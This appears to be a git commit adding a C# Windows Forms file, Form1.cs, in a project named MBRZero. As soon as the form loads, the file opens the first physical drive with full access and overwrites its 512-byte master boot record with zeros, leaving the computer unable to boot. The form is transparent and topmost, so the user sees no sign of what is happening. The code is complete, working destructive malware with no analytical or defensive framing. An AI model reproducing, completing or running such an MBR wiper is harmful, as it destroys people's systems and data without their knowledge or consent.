84717cd0df4180240b326edef773965f628e784b
GrumpBoatYT <89729202+GrumpBoatYT@users.noreply.github.com>
2023-02-04 11:23:55 +0700

    Add files via upload

---
+++ Form1.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace MBRZero
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateFile(string lpFileName, uint dwDesignedAccess, uint dwShareMode,
+            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+
+        [DllImport("kernel32")]
+        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
+            out uint lpNumberBytesWritten, IntPtr lpOverlapped);
+
+        private const uint GenericRead = 0x80000000;
+        private const uint GenericWrite = 0x40000000;
+        private const uint GenericExecute = 0x20000000;
+        private const uint GenericAll = 0x10000000;
+
+        private const uint FileShareRead = 0x1;
+        private const uint FileShareWrite = 0x2;
+        private const uint OpenExisting = 0x3;
+        private const uint FileFlagDeleteOnClose = 0x4000000;
+        private const uint MbrSize = 512u;
+        public Form1()
+        {
+            InitializeComponent();
+            this.TransparencyKey = this.BackColor;
+            TopMost = true;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Process.EnterDebugMode();
+            var mbrData = new byte[MbrSize];
+            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
+                OpenExisting, 0, IntPtr.Zero);
+            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
+        }
+    }
+}
